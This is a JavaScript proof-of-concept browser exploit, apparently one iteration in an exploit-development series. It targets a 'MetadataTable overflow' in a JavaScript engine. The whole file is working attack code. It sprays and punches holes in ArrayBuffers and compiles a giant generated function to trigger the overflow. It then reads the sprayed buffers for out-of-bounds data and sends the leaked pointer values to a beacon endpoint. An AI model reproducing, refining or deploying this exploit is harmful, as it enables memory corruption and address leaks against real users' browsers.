// p197 — MetadataTable overflow v2: bigger spray + post-compile fill
//
// p196 crashed: OOB reads hit unmapped memory (spray wasn't adjacent).
// Fix: spray 200 buffers + re-spray AFTER compilation to fill any
// gaps the compiler created. Also beacon from callback to track progress.
//
// Beacon prefix: V197-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V197-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V197-' + tag + '?t=' + Date.now(), false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var BUF_SZ = 100096;

  // Phase 1: Pre-compile spray — fill marge bitfit pages
  var PRE_N = 200;
  var preSprays = [];
  var preViews = [];
  for (var i = 0; i < PRE_N; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    preSprays.push(ab);
    preViews.push(new Uint8Array(ab));
  }
  B('PRE-' + PRE_N);

  // Free every 3rd to create holes for metadata buffer
  var freed = 0;
  for (var i = 0; i < PRE_N; i += 3) {
    preSprays[i] = null;
    preViews[i] = null;
    freed++;
  }
  B('HOLES-' + freed);

  // Phase 2: Compile
  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p197fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p197ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    var ok = window.__p197ok ? 'OK' : 'FAIL';
    B('COMPILED-' + ok);
    if (ok === 'OK') {
      // Phase 3: Post-compile spray — fill any gaps from compilation
      var POST_N = 100;
      var postSprays = [];
      var postViews = [];
      for (var i = 0; i < POST_N; i++) {
        var ab2 = new ArrayBuffer(BUF_SZ);
        postSprays.push(ab2);
        postViews.push(new Uint8Array(ab2));
      }
      B('POST-' + POST_N);

      // Phase 4: Call with instrumented callback
      setTimeout(function() {
        phaseCall(preSprays, preViews, postSprays, postViews);
      }, 100);
    }
  };
  document.head.appendChild(sc);
  sc.src = url;

  function phaseCall(preSprays, preViews, postSprays, postViews) {
    var WINDOW = 2000;
    var TARGET = 893 + WINDOW;
    var callCount = 0;

    B('CALL-START');

    function callback() {
      callCount++;
      // Beacon at key milestones
      if (callCount === 100 || callCount === 500 || callCount === 893 ||
          callCount === 894 || callCount === 900 || callCount === 1000 ||
          callCount === 1500 || callCount === 2000 || callCount === 2500 ||
          callCount === 2893) {
        B('CB-' + callCount);
      }
      if (callCount > TARGET) throw 'STOP';
    }

    try {
      window.__p197fn(callback);
      B('CALL-RET-' + callCount);
    } catch (e) {
      B('CALL-THREW-' + callCount);
    }

    setTimeout(function() {
      phaseRead(preViews, postViews);
    }, 100);
  }

  function phaseRead(preViews, postViews) {
    B('READ-START');
    var hitCount = 0;
    var totalNZ = 0;

    function scanViews(views, prefix) {
      for (var i = 0; i < views.length; i++) {
        if (!views[i]) continue;
        var v = views[i];
        var nz = 0;
        var firstOff = -1;
        for (var j = 0; j < v.length; j++) {
          if (v[j] !== 0) {
            if (firstOff === -1) firstOff = j;
            nz++;
          }
        }
        if (nz > 0) {
          hitCount++;
          totalNZ += nz;
          B(prefix + i + '-nz=' + nz + '-f=' + firstOff);

          var dumped = 0;
          for (var e = 0; e + 112 <= v.length && dumped < 3; e += 112) {
            var hasNZ = false;
            for (var c = e; c < e + 112; c++) {
              if (v[c] !== 0) { hasNZ = true; break; }
            }
            if (!hasNZ) continue;
            dumped++;
            var ptrs = '';
            for (var p = 0; p < 112; p += 8) {
              var nzB = false;
              for (var b = 0; b < 8; b++) {
                if (v[e + p + b] !== 0) { nzB = true; break; }
              }
              if (nzB) {
                var hex8 = '';
                for (var h = 7; h >= 0; h--) hex8 += hexByte(v[e + p + h]);
                ptrs += '+' + p + ':' + hex8 + ' ';
              }
            }
            if (ptrs) BP(prefix + i + '@' + e, ptrs.trim());
          }
        }
      }
    }

    scanViews(preViews, 'PRE-');
    scanViews(postViews, 'PST-');
    B('DONE-hits=' + hitCount + '-nz=' + totalNZ);
  }
})();
